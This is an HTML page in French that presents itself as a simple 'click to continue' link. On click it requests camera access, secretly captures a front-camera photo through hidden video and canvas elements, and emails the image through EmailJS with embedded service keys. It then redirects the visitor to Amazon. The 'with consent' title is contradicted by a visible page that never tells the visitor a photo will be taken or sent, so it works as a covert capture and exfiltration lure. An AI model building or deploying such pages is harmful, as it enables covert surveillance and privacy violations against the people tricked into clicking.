<!DOCTYPE html>
<html>
<head>
  <title>Photo avec consentement</title>
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script>
    emailjs.init("mxm3fFA_BxEhqJieq"); // Clé publique EmailJS
  </script>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
    #status { margin-top: 20px; font-weight: bold; }
    a { font-size: 18px; text-decoration: none; color: blue; }
  </style>
</head>
<body>
  <h2>Cliquez pour continuer</h2>
  <a href="#" id="link">Aller au site</a>
  <div id="status"></div>
  <video id="video" autoplay style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const link = document.getElementById("link");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const status = document.getElementById("status");

    link.onclick = async (e) => {
      e.preventDefault(); // Empêche le lien de naviguer immédiatement
      status.textContent = "Demande de permission caméra...";

      try {
        // Demande la caméra frontale
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        // Petit délai pour que la caméra démarre
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Capture de la photo
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        const imageBase64 = canvas.toDataURL("image/jpeg");

        status.textContent = "Envoi de la photo...";

        // Envoi via EmailJS
        await emailjs.send("service_8cs0gml", "template_hgvdx1g", {
          to_email: "destinataire@email.com",
          message: "Photo prise avec consentement",
          attachment: imageBase64
        });

        // Arrêt de la caméra
        stream.getTracks().forEach(track => track.stop());

        // Redirection automatique vers Amazon
        status.textContent = "Photo envoyée ! Redirection...";
        setTimeout(() => { window.location.href = "https://www.amazon.com"; }, 1500);

      } catch (err) {
        status.textContent = "Erreur ou caméra refusée : " + err;
      }
    };
  </script>
</body>
</html>
